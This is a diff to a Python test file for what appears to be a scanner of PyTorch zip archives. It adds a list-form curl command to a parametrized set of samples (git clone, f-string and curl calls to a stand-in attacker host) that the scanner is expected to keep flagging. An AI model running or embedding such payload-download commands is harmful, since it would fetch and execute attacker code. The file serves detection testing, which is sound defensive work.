@@ -4541,8 +4541,9 @@ def test_pytorch_zip_filters_urls_only_for_clean_pickle_members(
         "Use documentation example metadata | git clone https://attacker.example/payload",
         'f"{client:https://attacker.example/payload}"',
         "'/usr/bin/curl' 'https://attacker.example/payload'",
+        "['/usr/bin/curl', 'https://attacker.example/payload']",
     ],
-    ids=["shell-pipeline", "f-string-format-dispatch", "adjacent-curl-argv"],
+    ids=["shell-pipeline", "f-string-format-dispatch", "adjacent-curl-argv", "list-curl-argv"],
 )
 def test_pytorch_zip_keeps_implicit_execution_urls_actionable(
     tmp_path: Path,
